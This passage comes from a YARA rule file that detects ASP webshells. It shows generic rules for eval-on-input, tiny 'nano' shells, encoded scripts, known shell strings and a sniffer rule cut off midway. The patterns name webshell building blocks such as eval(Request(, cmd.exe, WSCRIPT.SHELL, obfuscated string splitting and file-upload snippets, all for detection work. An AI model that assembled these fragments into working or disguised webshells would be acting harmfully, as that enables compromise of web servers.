$asp_multi_payload_three1 = "System.Diagnostics" wide ascii
$asp_multi_payload_three2 = "Process" fullword wide ascii
$asp_multi_payload_three3 = ".Start" wide ascii
// this is about "MSXML2.DOMDocument" but since that's easily obfuscated, lets not search for it
$asp_multi_payload_four1 = "CreateObject" fullword nocase wide ascii
$asp_multi_payload_four2 = "TransformNode" fullword nocase wide ascii
$asp_multi_payload_four3 = "loadxml" fullword nocase wide ascii
// execute cmd.exe /c with arguments using ProcessStartInfo
$asp_multi_payload_five1 = "ProcessStartInfo" fullword nocase wide ascii
$asp_multi_payload_five2 = ".Start" nocase wide ascii
$asp_multi_payload_five3 = ".Filename" nocase wide ascii
$asp_multi_payload_five4 = ".Arguments" nocase wide ascii
//strings from private rule capa_asp_write_file
// $asp_write1 = "ADODB.Stream" wide ascii # just a string, can be easily obfuscated
$asp_always_write1 = /\.write/ nocase wide ascii
$asp_always_write2 = /\.swrite/ nocase wide ascii
//$asp_write_way_one1 = /\.open\b/ nocase wide ascii
$asp_write_way_one2 = "SaveToFile" fullword nocase wide ascii
$asp_write_way_one3 = "CREAtEtExtFiLE" fullword nocase wide ascii
$asp_cr_write1 = "CreateObject(" nocase wide ascii
$asp_cr_write2 = "CreateObject (" nocase wide ascii
$asp_streamwriter1 = "streamwriter" fullword nocase wide ascii
$asp_streamwriter2 = "filestream" fullword nocase wide ascii
//strings from private rule capa_asp_obfuscation_multi
// many Chr or few and a loop????
//$loop1 = "For "
//$o1 = "chr(" nocase wide ascii
//$o2 = "chr (" nocase wide ascii
// not excactly a string function but also often used in obfuscation
$o4 = "\\x8" wide ascii
$o5 = "\\x9" wide ascii
// just picking some random numbers because they should appear often enough in a long obfuscated blob and it's faster than a regex
$o6 = "\\61" wide ascii
$o7 = "\\44" wide ascii
$o8 = "\\112" wide ascii
$o9 = "\\120" wide ascii
//$o10 = " & \"" wide ascii
//$o11 = " += \"" wide ascii
// used for e.g. "scr"&"ipt"
$m_multi_one1 = "Replace(" wide ascii
$m_multi_one2 = "Len(" wide ascii
$m_multi_one3 = "Mid(" wide ascii
$m_multi_one4 = "mid(" wide ascii
$m_multi_one5 = ".ToString(" wide ascii
/*
$m_multi_one5 = "InStr(" wide ascii
$m_multi_one6 = "Function" wide ascii
$m_multi_two1 = "for each" wide ascii
$m_multi_two2 = "split(" wide ascii
$m_multi_two3 = " & chr(" wide ascii
$m_multi_two4 = " & Chr(" wide ascii
$m_multi_two5 = " & Chr (" wide ascii
$m_multi_three1 = "foreach" fullword wide ascii
$m_multi_three2 = "(char" wide ascii
$m_multi_four1 = "FromBase64String(" wide ascii
$m_multi_four2 = ".Replace(" wide ascii
$m_multi_five1 = "String.Join(\"\"," wide ascii
$m_multi_five2 = ".Trim(" wide ascii
$m_any1 = " & \"2" wide ascii
$m_any2 = " += \"2" wide ascii
*/
$m_fp1 = "Author: Andre Teixeira - andret@microsoft.com" /* FPs with 0227f4c366c07c45628b02bae6b4ad01 */
//strings from private rule capa_asp_obfuscation_obviously
$oo1 = /\w\"&\"\w/ wide ascii
$oo2 = "*/\").Replace(\"/*" wide ascii
condition:
filesize < 100KB and (
(
any of ( $tagasp_long* ) or
// TODO :  yara_push_private_rules.py doesn't do private rules in private rules yet
any of ( $tagasp_classid* ) or
(
$tagasp_short1 and
$tagasp_short2 in ( filesize-100..filesize )
) or (
$tagasp_short2 and (
$tagasp_short1 in ( 0..1000 ) or
$tagasp_short1 in ( filesize-1000..filesize )
)
)
) and not (
(
any of ( $perl* ) or
$php1 at 0 or
$php2 at 0
) or (
( #jsp1 + #jsp2 + #jsp3 ) > 0 and ( #jsp4 + #jsp5 + #jsp6 + #jsp7 ) > 0
)
)
)
and
( ( (
any of ( $asp_payload* ) or
all of ( $asp_multi_payload_one* ) or
all of ( $asp_multi_payload_two* ) or
all of ( $asp_multi_payload_three* ) or
all of ( $asp_multi_payload_four* ) or
all of ( $asp_multi_payload_five* )
)
or (
any of ( $asp_always_write* ) and
(
any of ( $asp_write_way_one* ) and
any of ( $asp_cr_write* )
) or (
any of ( $asp_streamwriter* )
)
)
) and
( (
(
filesize < 100KB and
not any of ( $m_fp* ) and
(
//( #o1+#o2 ) > 50 or
( #o4+#o5+#o6+#o7+#o8+#o9 ) > 20
)
) or (
filesize < 5KB and
(
//( #o1+#o2 ) > 10 or
( #o4+#o5+#o6+#o7+#o8+#o9 ) > 5 or
(
//( #o1+#o2 ) > 1 and
( #m_multi_one1 + #m_multi_one2 + #m_multi_one3 + #m_multi_one4 + #m_multi_one5 ) > 3
)
)
) or (
filesize < 700 and
(
//( #o1+#o2 ) > 1 or
( #o4+#o5+#o6+#o7+#o8+#o9 ) > 3 or
( #m_multi_one1 + #m_multi_one2 + #m_multi_one3 + #m_multi_one4 + #m_multi_one5 ) > 2
)
)
)
or any of ( $asp_obf* ) ) or (
(
filesize < 100KB and
(
( #oo1 ) > 2 or
$oo2
)
) or (
filesize < 25KB and
(
( #oo1 ) > 1
)
) or (
filesize < 1KB and
(
( #oo1 ) > 0
)
)
)
)
}
rule SSC_Swebshell_asp_generic_eval_on_input
{
meta:
description = "Generic ASP webshell which uses any eval/exec function directly on user input"
license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
author = "Arnim Rupp"
date = "2021/01/07"
hash = "d6b96d844ac395358ee38d4524105d331af42ede"
hash = "9be2088d5c3bfad9e8dfa2d7d7ba7834030c7407"
hash = "a1df4cfb978567c4d1c353e988915c25c19a0e4a"
hash = "069ea990d32fc980939fffdf1aed77384bf7806bc57c0a7faaff33bd1a3447f6"
strings:
$payload_and_input0 = /\beval_r\s{0,20}\(Request\(/ nocase wide ascii
$payload_and_input1 = /\beval[\s\(]{1,20}request[.\(\[]/ nocase wide ascii
$payload_and_input2 = /\bexecute[\s\(]{1,20}request\(/ nocase wide ascii
$payload_and_input4 = /\bExecuteGlobal\s{1,20}request\(/ nocase wide ascii
//strings from private rule capa_asp
$tagasp_short1 = /<%[^"]/ wide ascii
// also looking for %> to reduce fp (yeah, short atom but seldom since special chars)
$tagasp_short2 = "%>" wide ascii
// classids for scripting host etc
$tagasp_classid1 = "72C24DD5-D70A-438B-8A42-98424B88AFB8" nocase wide ascii
$tagasp_classid2 = "F935DC22-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
$tagasp_classid3 = "093FF999-1EA0-4079-9525-9614C3504B74" nocase wide ascii
$tagasp_classid4 = "F935DC26-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
$tagasp_classid5 = "0D43FE01-F093-11CF-8940-00A0C9054228" nocase wide ascii
$tagasp_long10 = "<%@ " wide ascii
// <% eval
$tagasp_long11 = /<% \w/ nocase wide ascii
$tagasp_long12 = "<%ex" nocase wide ascii
$tagasp_long13 = "<%ev" nocase wide ascii
// <%@ LANGUAGE = VBScript.encode%>
// <%@ Language = "JScript" %>
// <%@ WebHandler Language="C#" class="Handler" %>
// <%@ WebService Language="C#" Class="Service" %>
// <%@Page Language="Jscript"%>
// <%@ Page Language = Jscript %>
// <%@PAGE LANGUAGE=JSCRIPT%>
// <%@ Page Language="Jscript" validateRequest="false" %>
// <%@ Page Language = Jscript %>
// <%@ Page Language="C#" %>
// <%@ Page Language="VB" ContentType="text/html" validaterequest="false" AspCompat="true" Debug="true" %>
// <script runat="server" language="JScript">
// <SCRIPT RUNAT=SERVER LANGUAGE=JSCRIPT>
// <SCRIPT  RUNAT=SERVER  LANGUAGE=JSCRIPT>
// <msxsl:script language="JScript" ...
$tagasp_long20 = /<(%|script|msxsl:script).{0,60}language="?(vb|jscript|c#)/ nocase wide ascii
$tagasp_long32 = /<script\s{1,30}runat=/ wide ascii
$tagasp_long33 = /<SCRIPT\s{1,30}RUNAT=/ wide ascii
// avoid hitting php
$php1 = "<?php"
$php2 = "<?="
// avoid hitting jsp
$jsp1 = "=\"java." wide ascii
$jsp2 = "=\"javax." wide ascii
$jsp3 = "java.lang." wide ascii
$jsp4 = "public" fullword wide ascii
$jsp5 = "throws" fullword wide ascii
$jsp6 = "getValue" fullword wide ascii
$jsp7 = "getBytes" fullword wide ascii
$perl1 = "PerlScript" fullword
condition:
( filesize < 1100KB and (
(
any of ( $tagasp_long* ) or
// TODO :  yara_push_private_rules.py doesn't do private rules in private rules yet
any of ( $tagasp_classid* ) or
(
$tagasp_short1 and
$tagasp_short2 in ( filesize-100..filesize )
) or (
$tagasp_short2 and (
$tagasp_short1 in ( 0..1000 ) or
$tagasp_short1 in ( filesize-1000..filesize )
)
)
) and not (
(
any of ( $perl* ) or
$php1 at 0 or
$php2 at 0
) or (
( #jsp1 + #jsp2 + #jsp3 ) > 0 and ( #jsp4 + #jsp5 + #jsp6 + #jsp7 ) > 0
)
)
)
and any of ( $payload_and_input* ) ) or
( filesize < 100 and any of ( $payload_and_input* ) )
}
rule SSC_Swebshell_asp_nano
{
meta:
description = "Generic ASP webshell which uses any eval/exec function"
license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
author = "Arnim Rupp"
date = "2021/01/13"
modified = "2023-01-06"
hash = "3b7910a499c603715b083ddb6f881c1a0a3a924d"
hash = "990e3f129b8ba409a819705276f8fa845b95dad0"
hash = "22345e956bce23304f5e8e356c423cee60b0912c"
hash = "c84a6098fbd89bd085526b220d0a3f9ab505bcba"
hash = "b977c0ad20dc738b5dacda51ec8da718301a75d7"
strings:
$susasp1  = "/*-/*-*/"
$susasp2  = "(\"%1"
$susasp3  = /[Cc]hr\([Ss]tr\(/
$susasp4  = "cmd.exe"
$susasp5  = "cmd /c"
$susasp7  = "FromBase64String"
// Request and request in b64:
$susasp8  = "UmVxdWVzdC"
$susasp9  = "cmVxdWVzdA"
$susasp10 = "/*//*/"
$susasp11 = "(\"/*/\""
$susasp12 = "eval(eval("
$fp1      = "eval a"
$fp2      = "'Eval'"
$fp3      = "Eval(\""
//strings from private rule capa_asp
$tagasp_short1 = /<%[^"]/ wide ascii
// also looking for %> to reduce fp (yeah, short atom but seldom since special chars)
$tagasp_short2 = "%>" wide ascii
// classids for scripting host etc
$tagasp_classid1 = "72C24DD5-D70A-438B-8A42-98424B88AFB8" nocase wide ascii
$tagasp_classid2 = "F935DC22-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
$tagasp_classid3 = "093FF999-1EA0-4079-9525-9614C3504B74" nocase wide ascii
$tagasp_classid4 = "F935DC26-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
$tagasp_classid5 = "0D43FE01-F093-11CF-8940-00A0C9054228" nocase wide ascii
$tagasp_long10 = "<%@ " wide ascii
// <% eval
$tagasp_long11 = /<% \w/ nocase wide ascii
$tagasp_long12 = "<%ex" nocase wide ascii
$tagasp_long13 = "<%ev" nocase wide ascii
// <%@ LANGUAGE = VBScript.encode%>
// <%@ Language = "JScript" %>
// <%@ WebHandler Language="C#" class="Handler" %>
// <%@ WebService Language="C#" Class="Service" %>
// <%@Page Language="Jscript"%>
// <%@ Page Language = Jscript %>
// <%@PAGE LANGUAGE=JSCRIPT%>
// <%@ Page Language="Jscript" validateRequest="false" %>
// <%@ Page Language = Jscript %>
// <%@ Page Language="C#" %>
// <%@ Page Language="VB" ContentType="text/html" validaterequest="false" AspCompat="true" Debug="true" %>
// <script runat="server" language="JScript">
// <SCRIPT RUNAT=SERVER LANGUAGE=JSCRIPT>
// <SCRIPT  RUNAT=SERVER  LANGUAGE=JSCRIPT>
// <msxsl:script language="JScript" ...
$tagasp_long20 = /<(%|script|msxsl:script).{0,60}language="?(vb|jscript|c#)/ nocase wide ascii
$tagasp_long32 = /<script\s{1,30}runat=/ wide ascii
$tagasp_long33 = /<SCRIPT\s{1,30}RUNAT=/ wide ascii
// avoid hitting php
$php1 = "<?php"
$php2 = "<?="
// avoid hitting jsp
$jsp1 = "=\"java." wide ascii
$jsp2 = "=\"javax." wide ascii
$jsp3 = "java.lang." wide ascii
$jsp4 = "public" fullword wide ascii
$jsp5 = "throws" fullword wide ascii
$jsp6 = "getValue" fullword wide ascii
$jsp7 = "getBytes" fullword wide ascii
$perl1 = "PerlScript" fullword
//strings from private rule capa_asp_payload
$asp_payload0  = "eval_r" fullword nocase wide ascii
$asp_payload1  = /\beval\s/ nocase wide ascii
$asp_payload2  = /\beval\(/ nocase wide ascii
$asp_payload3  = /\beval\"\"/ nocase wide ascii
// var Fla = {'E':eval};  Fla.E(code)
$asp_payload4  = /:\s{0,10}eval\b/ nocase wide ascii
$asp_payload8  = /\bexecute\s?\(/ nocase wide ascii
$asp_payload9  = /\bexecute\s[\w"]/ nocase wide ascii
$asp_payload11 = "WSCRIPT.SHELL" fullword nocase wide ascii
$asp_payload13 = "ExecuteGlobal" fullword nocase wide ascii
$asp_payload14 = "ExecuteStatement" fullword nocase wide ascii
$asp_payload15 = "ExecuteStatement" fullword nocase wide ascii
$asp_multi_payload_one1 = "CreateObject" nocase fullword wide ascii
$asp_multi_payload_one2 = "addcode" fullword wide ascii
$asp_multi_payload_one3 = /\.run\b/ wide ascii
$asp_multi_payload_two1 = "CreateInstanceFromVirtualPath" fullword wide ascii
$asp_multi_payload_two2 = "ProcessRequest" fullword wide ascii
$asp_multi_payload_two3 = "BuildManager" fullword wide ascii
$asp_multi_payload_three1 = "System.Diagnostics" wide ascii
$asp_multi_payload_three2 = "Process" fullword wide ascii
$asp_multi_payload_three3 = ".Start" wide ascii
// this is about "MSXML2.DOMDocument" but since that's easily obfuscated, lets not search for it
$asp_multi_payload_four1 = "CreateObject" fullword nocase wide ascii
$asp_multi_payload_four2 = "TransformNode" fullword nocase wide ascii
$asp_multi_payload_four3 = "loadxml" fullword nocase wide ascii
// execute cmd.exe /c with arguments using ProcessStartInfo
$asp_multi_payload_five1 = "ProcessStartInfo" fullword nocase wide ascii
$asp_multi_payload_five2 = ".Start" nocase wide ascii
$asp_multi_payload_five3 = ".Filename" nocase wide ascii
$asp_multi_payload_five4 = ".Arguments" nocase wide ascii
//strings from private rule capa_asp_write_file
// $asp_write1 = "ADODB.Stream" wide ascii # just a string, can be easily obfuscated
$asp_always_write1 = /\.write/ nocase wide ascii
$asp_always_write2 = /\.swrite/ nocase wide ascii
//$asp_write_way_one1 = /\.open\b/ nocase wide ascii
$asp_write_way_one2 = "SaveToFile" fullword nocase wide ascii
$asp_write_way_one3 = "CREAtEtExtFiLE" fullword nocase wide ascii
$asp_cr_write1 = "CreateObject(" nocase wide ascii
$asp_cr_write2 = "CreateObject (" nocase wide ascii
$asp_streamwriter1 = "streamwriter" fullword nocase wide ascii
$asp_streamwriter2 = "filestream" fullword nocase wide ascii
condition:
(
(
any of ( $tagasp_long* ) or
// TODO :  yara_push_private_rules.py doesn't do private rules in private rules yet
any of ( $tagasp_classid* ) or
(
$tagasp_short1 and
$tagasp_short2 in ( filesize-100..filesize )
) or (
$tagasp_short2 and (
$tagasp_short1 in ( 0..1000 ) or
$tagasp_short1 in ( filesize-1000..filesize )
)
)
) and not (
(
any of ( $perl* ) or
$php1 at 0 or
$php2 at 0
) or (
( #jsp1 + #jsp2 + #jsp3 ) > 0 and ( #jsp4 + #jsp5 + #jsp6 + #jsp7 ) > 0
)
)
)
and
( (
any of ( $asp_payload* ) or
all of ( $asp_multi_payload_one* ) or
all of ( $asp_multi_payload_two* ) or
all of ( $asp_multi_payload_three* ) or
all of ( $asp_multi_payload_four* ) or
all of ( $asp_multi_payload_five* )
)
or (
any of ( $asp_always_write* ) and
(
any of ( $asp_write_way_one* ) and
any of ( $asp_cr_write* )
) or (
any of ( $asp_streamwriter* )
)
)
) and not any of ( $fp* ) and
( filesize < 200 or
( filesize < 1000 and any of ( $susasp* ) ) )
}
rule SSC_Swebshell_asp_encoded
{
meta:
description = "Webshell in VBscript or JScript encoded using *.Encode plus a suspicious string"
license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
author = "Arnim Rupp"
date = "2021/03/14"
strings:
$encoded1 = "VBScript.Encode" nocase wide ascii
$encoded2 = "JScript.Encode" nocase wide ascii
$data1 = "#@~^" wide ascii
$sus1 = "shell" nocase wide ascii
$sus2 = "cmd" fullword wide ascii
$sus3 = "password" fullword wide ascii
$sus4 = "UserPass" fullword wide ascii
//strings from private rule capa_asp
$tagasp_short1 = /<%[^"]/ wide ascii
// also looking for %> to reduce fp (yeah, short atom but seldom since special chars)
$tagasp_short2 = "%>" wide ascii
// classids for scripting host etc
$tagasp_classid1 = "72C24DD5-D70A-438B-8A42-98424B88AFB8" nocase wide ascii
$tagasp_classid2 = "F935DC22-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
$tagasp_classid3 = "093FF999-1EA0-4079-9525-9614C3504B74" nocase wide ascii
$tagasp_classid4 = "F935DC26-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
$tagasp_classid5 = "0D43FE01-F093-11CF-8940-00A0C9054228" nocase wide ascii
$tagasp_long10 = "<%@ " wide ascii
// <% eval
$tagasp_long11 = /<% \w/ nocase wide ascii
$tagasp_long12 = "<%ex" nocase wide ascii
$tagasp_long13 = "<%ev" nocase wide ascii
// <%@ LANGUAGE = VBScript.encode%>
// <%@ Language = "JScript" %>
// <%@ WebHandler Language="C#" class="Handler" %>
// <%@ WebService Language="C#" Class="Service" %>
// <%@Page Language="Jscript"%>
// <%@ Page Language = Jscript %>
// <%@PAGE LANGUAGE=JSCRIPT%>
// <%@ Page Language="Jscript" validateRequest="false" %>
// <%@ Page Language = Jscript %>
// <%@ Page Language="C#" %>
// <%@ Page Language="VB" ContentType="text/html" validaterequest="false" AspCompat="true" Debug="true" %>
// <script runat="server" language="JScript">
// <SCRIPT RUNAT=SERVER LANGUAGE=JSCRIPT>
// <SCRIPT  RUNAT=SERVER  LANGUAGE=JSCRIPT>
// <msxsl:script language="JScript" ...
$tagasp_long20 = /<(%|script|msxsl:script).{0,60}language="?(vb|jscript|c#)/ nocase wide ascii
$tagasp_long32 = /<script\s{1,30}runat=/ wide ascii
$tagasp_long33 = /<SCRIPT\s{1,30}RUNAT=/ wide ascii
// avoid hitting php
$php1 = "<?php"
$php2 = "<?="
// avoid hitting jsp
$jsp1 = "=\"java." wide ascii
$jsp2 = "=\"javax." wide ascii
$jsp3 = "java.lang." wide ascii
$jsp4 = "public" fullword wide ascii
$jsp5 = "throws" fullword wide ascii
$jsp6 = "getValue" fullword wide ascii
$jsp7 = "getBytes" fullword wide ascii
$perl1 = "PerlScript" fullword
condition:
filesize < 500KB and (
(
any of ( $tagasp_long* ) or
// TODO :  yara_push_private_rules.py doesn't do private rules in private rules yet
any of ( $tagasp_classid* ) or
(
$tagasp_short1 and
$tagasp_short2 in ( filesize-100..filesize )
) or (
$tagasp_short2 and (
$tagasp_short1 in ( 0..1000 ) or
$tagasp_short1 in ( filesize-1000..filesize )
)
)
) and not (
(
any of ( $perl* ) or
$php1 at 0 or
$php2 at 0
) or (
( #jsp1 + #jsp2 + #jsp3 ) > 0 and ( #jsp4 + #jsp5 + #jsp6 + #jsp7 ) > 0
)
)
)
and any of ( $encoded* ) and any of ( $data* ) and
( any of ( $sus* ) or
( filesize < 20KB and #data1 > 4 ) or
( filesize < 700 and #data1 > 0 ) )
}
rule SSC_Swebshell_asp_encoded_aspcoding
{
meta:
description = "ASP Webshell encoded using ASPEncodeDLL.AspCoding"
license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
author = "Arnim Rupp"
date = "2021/03/14"
score = 60
strings:
$encoded1 = "ASPEncodeDLL" fullword nocase wide ascii
$encoded2 = ".Runt" nocase wide ascii
$encoded3 = "Request" fullword nocase wide ascii
$encoded4 = "Response" fullword nocase wide ascii
$data1 = "AspCoding.EnCode" wide ascii
//$sus1 = "shell" nocase wide ascii
//$sus2 = "cmd" fullword wide ascii
//$sus3 = "password" fullword wide ascii
//$sus4 = "UserPass" fullword wide ascii
//strings from private rule capa_asp
$tagasp_short1 = /<%[^"]/ wide ascii
// also looking for %> to reduce fp (yeah, short atom but seldom since special chars)
$tagasp_short2 = "%>" wide ascii
// classids for scripting host etc
$tagasp_classid1 = "72C24DD5-D70A-438B-8A42-98424B88AFB8" nocase wide ascii
$tagasp_classid2 = "F935DC22-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
$tagasp_classid3 = "093FF999-1EA0-4079-9525-9614C3504B74" nocase wide ascii
$tagasp_classid4 = "F935DC26-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
$tagasp_classid5 = "0D43FE01-F093-11CF-8940-00A0C9054228" nocase wide ascii
$tagasp_long10 = "<%@ " wide ascii
// <% eval
$tagasp_long11 = /<% \w/ nocase wide ascii
$tagasp_long12 = "<%ex" nocase wide ascii
$tagasp_long13 = "<%ev" nocase wide ascii
// <%@ LANGUAGE = VBScript.encode%>
// <%@ Language = "JScript" %>
// <%@ WebHandler Language="C#" class="Handler" %>
// <%@ WebService Language="C#" Class="Service" %>
// <%@Page Language="Jscript"%>
// <%@ Page Language = Jscript %>
// <%@PAGE LANGUAGE=JSCRIPT%>
// <%@ Page Language="Jscript" validateRequest="false" %>
// <%@ Page Language = Jscript %>
// <%@ Page Language="C#" %>
// <%@ Page Language="VB" ContentType="text/html" validaterequest="false" AspCompat="true" Debug="true" %>
// <script runat="server" language="JScript">
// <SCRIPT RUNAT=SERVER LANGUAGE=JSCRIPT>
// <SCRIPT  RUNAT=SERVER  LANGUAGE=JSCRIPT>
// <msxsl:script language="JScript" ...
$tagasp_long20 = /<(%|script|msxsl:script).{0,60}language="?(vb|jscript|c#)/ nocase wide ascii
$tagasp_long32 = /<script\s{1,30}runat=/ wide ascii
$tagasp_long33 = /<SCRIPT\s{1,30}RUNAT=/ wide ascii
// avoid hitting php
$php1 = "<?php"
$php2 = "<?="
// avoid hitting jsp
$jsp1 = "=\"java." wide ascii
$jsp2 = "=\"javax." wide ascii
$jsp3 = "java.lang." wide ascii
$jsp4 = "public" fullword wide ascii
$jsp5 = "throws" fullword wide ascii
$jsp6 = "getValue" fullword wide ascii
$jsp7 = "getBytes" fullword wide ascii
$perl1 = "PerlScript" fullword
condition:
filesize < 500KB and (
(
any of ( $tagasp_long* ) or
// TODO :  yara_push_private_rules.py doesn't do private rules in private rules yet
any of ( $tagasp_classid* ) or
(
$tagasp_short1 and
$tagasp_short2 in ( filesize-100..filesize )
) or (
$tagasp_short2 and (
$tagasp_short1 in ( 0..1000 ) or
$tagasp_short1 in ( filesize-1000..filesize )
)
)
) and not (
(
any of ( $perl* ) or
$php1 at 0 or
$php2 at 0
) or (
( #jsp1 + #jsp2 + #jsp3 ) > 0 and ( #jsp4 + #jsp5 + #jsp6 + #jsp7 ) > 0
)
)
)
and all of ( $encoded* ) and any of ( $data* )
}
rule SSC_Swebshell_asp_by_string
{
meta:
description = "Known ASP Webshells which contain unique strings, lousy rule for low hanging fruits. Most are catched by other rules in here but maybe these catch different versions."
license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
author = "Arnim Rupp"
date = "2021/01/13"
hash = "f72252b13d7ded46f0a206f63a1c19a66449f216"
strings:
// reversed
$asp_string1  = "tseuqer lave" wide ascii
$asp_string2  = ":eval request(" wide ascii
$asp_string3  = ":eval request(" wide ascii
$asp_string4  = "SItEuRl=\"http://www.zjjv.com\"" wide ascii
$asp_string5  = "ServerVariables(\"HTTP_HOST\"),\"gov.cn\"" wide ascii
// e+k-v+k-a+k-l
// e+x-v+x-a+x-l
$asp_string6  = /e\+.-v\+.-a\+.-l/ wide ascii
$asp_string7  = "r+x-e+x-q+x-u" wide ascii
$asp_string8  = "add6bb58e139be10" fullword wide ascii
$asp_string9  = "WebAdmin2Y.x.y(\"" wide ascii
$asp_string10 = "<%if (Request.Files.Count!=0) { Request.Files[0].SaveAs(Server.MapPath(Request[" wide ascii
$asp_string11 = "<% If Request.Files.Count <> 0 Then Request.Files(0).SaveAs(Server.MapPath(Request(" wide ascii
// Request.Item["
$asp_string12 = "UmVxdWVzdC5JdGVtWyJ" wide ascii
// eval( in utf7 in base64 all 3 versions
$asp_string13 = "UAdgBhAGwAKA" wide ascii
$asp_string14 = "lAHYAYQBsACgA" wide ascii
$asp_string15 = "ZQB2AGEAbAAoA" wide ascii
// request in utf7 in base64 all 3 versions
$asp_string16 = "IAZQBxAHUAZQBzAHQAKA" wide ascii
$asp_string17 = "yAGUAcQB1AGUAcwB0ACgA" wide ascii
$asp_string18 = "cgBlAHEAdQBlAHMAdAAoA" wide ascii
$asp_string19 = "\"ev\"&\"al" wide ascii
$asp_string20 = "\"Sc\"&\"ri\"&\"p" wide ascii
$asp_string21 = "C\"&\"ont\"&\"" wide ascii
$asp_string22 = "\"vb\"&\"sc" wide ascii
$asp_string23 = "\"A\"&\"do\"&\"d" wide ascii
$asp_string24 = "St\"&\"re\"&\"am\"" wide ascii
$asp_string25 = "*/eval(" wide ascii
$asp_string26 = "\"e\"&\"v\"&\"a\"&\"l" nocase
$asp_string27 = "<%eval\"\"&(\"" nocase wide ascii
$asp_string28 = "6877656D2B736972786677752B237E232C2A"  wide ascii
$asp_string29 = "ws\"&\"cript.shell" wide ascii
$asp_string30 = "SerVer.CreAtEoBjECT(\"ADODB.Stream\")" wide ascii
$asp_string31 = "ASPShell - web based shell" wide ascii
$asp_string32 = "<++ CmdAsp.asp ++>" wide ascii
$asp_string33 = "\"scr\"&\"ipt\"" wide ascii
$asp_string34 = "Regex regImg = new Regex(\"[a-z|A-Z]{1}:\\\\\\\\[a-z|A-Z| |0-9|\\u4e00-\\u9fa5|\\\\~|\\\\\\\\|_|{|}|\\\\.]*\");" wide ascii
$asp_string35 = "\"she\"&\"ll." wide ascii
$asp_string36 = "LH\"&\"TTP" wide ascii
$asp_string37 = "<title>Web Sniffer</title>" wide ascii
$asp_string38 = "<title>WebSniff" wide ascii
$asp_string39 = "cript\"&\"ing" wide ascii
$asp_string40 = "tcejbOmetsySeliF.gnitpircS" wide ascii
$asp_string41 = "tcejbOetaerC.revreS" wide ascii
$asp_string42 = "This file is part of A Black Path Toward The Sun (\"ABPTTS\")" wide ascii
$asp_string43 = "if ((Request.Headers[headerNameKey] != null) && (Request.Headers[headerNameKey].Trim() == headerValueKey.Trim()))" wide ascii
$asp_string44 = "if (request.getHeader(headerNameKey).toString().trim().equals(headerValueKey.trim()))" wide ascii
$asp_string45 = "Response.Write(Server.HtmlEncode(ExcutemeuCmd(txtArg.Text)));" wide ascii
$asp_string46 = "\"c\" + \"m\" + \"d\"" wide ascii
$asp_string47 = "\".\"+\"e\"+\"x\"+\"e\"" wide ascii
//strings from private rule capa_asp
$tagasp_short1 = /<%[^"]/ wide ascii
// also looking for %> to reduce fp (yeah, short atom but seldom since special chars)
$tagasp_short2 = "%>" wide ascii
// classids for scripting host etc
$tagasp_classid1 = "72C24DD5-D70A-438B-8A42-98424B88AFB8" nocase wide ascii
$tagasp_classid2 = "F935DC22-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
$tagasp_classid3 = "093FF999-1EA0-4079-9525-9614C3504B74" nocase wide ascii
$tagasp_classid4 = "F935DC26-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
$tagasp_classid5 = "0D43FE01-F093-11CF-8940-00A0C9054228" nocase wide ascii
$tagasp_long10 = "<%@ " wide ascii
// <% eval
$tagasp_long11 = /<% \w/ nocase wide ascii
$tagasp_long12 = "<%ex" nocase wide ascii
$tagasp_long13 = "<%ev" nocase wide ascii
// <%@ LANGUAGE = VBScript.encode%>
// <%@ Language = "JScript" %>
// <%@ WebHandler Language="C#" class="Handler" %>
// <%@ WebService Language="C#" Class="Service" %>
// <%@Page Language="Jscript"%>
// <%@ Page Language = Jscript %>
// <%@PAGE LANGUAGE=JSCRIPT%>
// <%@ Page Language="Jscript" validateRequest="false" %>
// <%@ Page Language = Jscript %>
// <%@ Page Language="C#" %>
// <%@ Page Language="VB" ContentType="text/html" validaterequest="false" AspCompat="true" Debug="true" %>
// <script runat="server" language="JScript">
// <SCRIPT RUNAT=SERVER LANGUAGE=JSCRIPT>
// <SCRIPT  RUNAT=SERVER  LANGUAGE=JSCRIPT>
// <msxsl:script language="JScript" ...
$tagasp_long20 = /<(%|script|msxsl:script).{0,60}language="?(vb|jscript|c#)/ nocase wide ascii
$tagasp_long32 = /<script\s{1,30}runat=/ wide ascii
$tagasp_long33 = /<SCRIPT\s{1,30}RUNAT=/ wide ascii
// avoid hitting php
$php1 = "<?php"
$php2 = "<?="
// avoid hitting jsp
$jsp1 = "=\"java." wide ascii
$jsp2 = "=\"javax." wide ascii
$jsp3 = "java.lang." wide ascii
$jsp4 = "public" fullword wide ascii
$jsp5 = "throws" fullword wide ascii
$jsp6 = "getValue" fullword wide ascii
$jsp7 = "getBytes" fullword wide ascii
$perl1 = "PerlScript" fullword
condition:
filesize < 200KB and (
(
any of ( $tagasp_long* ) or
// TODO :  yara_push_private_rules.py doesn't do private rules in private rules yet
any of ( $tagasp_classid* ) or
(
$tagasp_short1 and
$tagasp_short2 in ( filesize-100..filesize )
) or (
$tagasp_short2 and (
$tagasp_short1 in ( 0..1000 ) or
$tagasp_short1 in ( filesize-1000..filesize )
)
)
) and not (
(
any of ( $perl* ) or
$php1 at 0 or
$php2 at 0
) or (
( #jsp1 + #jsp2 + #jsp3 ) > 0 and ( #jsp4 + #jsp5 + #jsp6 + #jsp7 ) > 0
)
)
)
and any of ( $asp_string* )
}
rule SSC_Swebshell_asp_sniffer
{
meta:
description = "ASP webshell which can sniff local traffic"
license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
author = "Arnim Rupp"
date = "2021/03/14"
strings:
$sniff1 = "Socket(" wide ascii
$sniff2 = ".Bind(" wide ascii
